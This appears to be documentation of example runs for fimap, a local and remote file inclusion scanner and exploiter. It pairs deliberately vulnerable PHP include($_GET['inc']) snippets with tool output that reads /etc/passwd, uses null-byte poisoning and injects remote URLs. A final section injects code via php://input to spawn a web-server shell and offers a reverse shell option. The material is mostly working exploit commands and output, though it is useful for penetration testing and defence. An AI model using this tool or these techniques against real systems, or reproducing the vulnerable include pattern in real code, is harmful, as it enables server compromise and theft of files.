# Example Runs #

## Absolute Clean ##
```
    <?
      // Vulerable PHP Code:
      include($_GET["inc"]);
    ?>
```

  * fimap'ing it:
```
imax@DevelB0x:~$ fimap -u "http://localhost/vulnerable.php?inc=index.php"
fimap v.01 by Iman Karim - Automatic LFI/RFI scanner and exploiter.
SingleScan is testing URL: 'http://localhost/vulnerable.php?inc=index.php'
[OUT] Parsing URL 'http://localhost/vulnerable.php?inc=index.php'...
[INFO] Fiddling around with URL...
[OUT] Possible file inclusion found! -> 'http://localhost/vulnerable.php?inc=283wnWJP' with Parameter 'inc'.
[OUT] Identifing Vulnerability 'http://localhost/vulnerable.php?inc=index.php' with Key 'inc'...
[INFO] Scriptpath received: '/var/www'
[INFO] Testing file '/etc/passwd'...
[INFO] Testing file '/proc/self/environ'...
[INFO] Testing file 'php://input'...
[INFO] Testing file 'http://www.phpbb.de/index.php'...
[INFO] Testing file 'http://www.uni-bonn.de/Frauengeschichte/index.html'...
[INFO] Testing file 'http://www.kah-bonn.de/index.htm?presse/winterthur.htm'...
###################################################################################
#[1] Possible File Injection                                                      #
###################################################################################
#  [URL]      http://localhost/vulnerable.php?inc=index.php                       #
#  [PARAM]    inc                                                                 #
#  [PATH]     /var/www                                                            #
#  [TYPE]     Absolute Clean + Remote injection                                   #
#  [NULLBYTE] No Need. It's clean.                                                #
#  [READABLE FILES]                                                               #
#                   [0] /etc/passwd                                               #
#                   [1] php://input                                               #
#                   [2] http://www.phpbb.de/index.php                             #
#                   [3] http://www.uni-bonn.de/Frauengeschichte/index.html        #
#                   [4] http://www.kah-bonn.de/index.htm?presse/winterthur.htm    #
###################################################################################

```




## Absolute with Appendix ##
```
    <?
      // Vulerable PHP Code:
      <? include($_GET["inc"] . ".php"); ?>
    ?>
```

  * fimap'ing it:
```
imax@DevelB0x:~$ fimap -u "http://localhost/vulnerable.php?inc=index"
fimap v.01 by Iman Karim - Automatic LFI/RFI scanner and exploiter.
SingleScan is testing URL: 'http://localhost/vulnerable.php?inc=index'
[OUT] Parsing URL 'http://localhost/vulnerable.php?inc=index'...
[INFO] Fiddling around with URL...
[OUT] Possible file inclusion found! -> 'http://localhost/vulnerable.php?inc=E9Zk658J' with Parameter 'inc'.
[OUT] Identifing Vulnerability 'http://localhost/vulnerable.php?inc=index' with Key 'inc'...
[INFO] Scriptpath received: '/var/www'
[INFO] Trying NULL-Byte Poisoning to get rid of the suffix...
[INFO] NULL-Byte Poisoning successfull!
[INFO] Testing file '/etc/passwd'...
[INFO] Testing file '/proc/self/environ'...
[INFO] Testing file 'php://input'...
[INFO] Testing file 'http://www.phpbb.de/index.php'...
[INFO] Testing file 'http://www.uni-bonn.de/Frauengeschichte/index.html'...
[INFO] Testing file 'www.kah-bonn.de/index.htm?presse/winterthur.htm'...
########################################################################################################################################
#[1] Possible File Injection                                                                                                           #
########################################################################################################################################
#  [URL]      http://localhost/vulnerable.php?inc=index                                                                                #
#  [PARAM]    inc                                                                                                                      #
#  [PATH]     /var/www                                                                                                                 #
#  [TYPE]     Absolute with appendix '.php' + Remote injection                                                                         #
#  [NULLBYTE] Works. :)                                                                                                                #
#  [READABLE FILES]                                                                                                                    #
#                   [0] /etc/passwd -> /etc/passwd%00                                                                                  #
#                   [1] php://input -> php://input%00                                                                                  #
#                   [2] http://www.phpbb.de/index.php -> http://www.phpbb.de/index.php%00                                              #
#                   [3] http://www.uni-bonn.de/Frauengeschichte/index.html -> http://www.uni-bonn.de/Frauengeschichte/index.html%00    #
########################################################################################################################################

```

## Relative with Appendix ##
```
    <?
      // Vulerable PHP Code:
      include("/var/www/" . $_GET["inc"] . ".php");
    ?>
```
  * fimap'ing it...
```
imax@DevelB0x:~$ fimap -u "http://localhost/vulnerable.php?inc=index"
fimap v.01 by Iman Karim - Automatic LFI/RFI scanner and exploiter.
SingleScan is testing URL: 'http://localhost/vulnerable.php?inc=index'
[OUT] Parsing URL 'http://localhost/vulnerable.php?inc=index'...
[INFO] Fiddling around with URL...
[OUT] Possible file inclusion found! -> 'http://localhost/vulnerable.php?inc=y3qfVVpx' with Parameter 'inc'.
[OUT] Identifing Vulnerability 'http://localhost/vulnerable.php?inc=index' with Key 'inc'...
[INFO] Scriptpath received: '/var/www'
[INFO] Trying NULL-Byte Poisoning to get rid of the suffix...
[INFO] NULL-Byte Poisoning successfull!
[INFO] Testing file '/etc/passwd'...
[INFO] Testing file '/proc/self/environ'...
[INFO] Skipping absolute file 'php://input'.
[INFO] Skipping remote file 'http://www.phpbb.de/index.php'.
[INFO] Skipping remote file 'http://www.uni-bonn.de/Frauengeschichte/index.html'.
[INFO] Skipping remote file 'www.kah-bonn.de/index.htm?presse/winterthur.htm'.
###############################################################
#[1] Possible File Injection                                  #
###############################################################
#  [URL]      http://localhost/vulnerable.php?inc=index       #
#  [PARAM]    inc                                             #
#  [PATH]     /var/www                                        #
#  [TYPE]     Relative with appendix '.php'                   #
#  [NULLBYTE] Works. :)                                       #
#  [READABLE FILES]                                           #
#                   [0] /etc/passwd -> ../../etc/passwd%00    #
###############################################################
```

## Obtaining a Shell ##
```
imax@DevelB0x:~$ fimap -x
fimap v.01 by Iman Karim - Automatic LFI/RFI scanner and exploiter.
###################
#List of Domains  #
###################
#[1] localhost    #
###################
Choose Domain: 1
###########################################################################################
#FI Bugs on localhost                                                                     #
###########################################################################################
#[1] URL: '/vulnerable.php?inc=index' injecting file: 'php://input' using param: 'inc'    #
###########################################################################################
Choose vulnerable script: 1
[INFO] Testing code injection thru POST...
[OUT] PHP Injection works! Testing if execution works...
[OUT] Testing execution thru 'popen'...
#################################
#Available Attacks              #
#################################
#[1] Spawn Shell                #
#[2] Create reverse shell...    #
#################################
Choose Attack: 1
-------------------------------------------
Welcome to fimap shell!
Better dont start interactive commands! ;)
Enter 'q' to exit the shell.
-------------------------------------------
fimap_shell$> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
fimap_shell$> uname -a
Linux DevelB0x 2.6.28-11-generic #42-Ubuntu SMP Fri Apr 17 01:57:59 UTC 2009 i686 GNU/Linux
fimap_shell$> q

See ya dude!
imax@DevelB0x:~$
```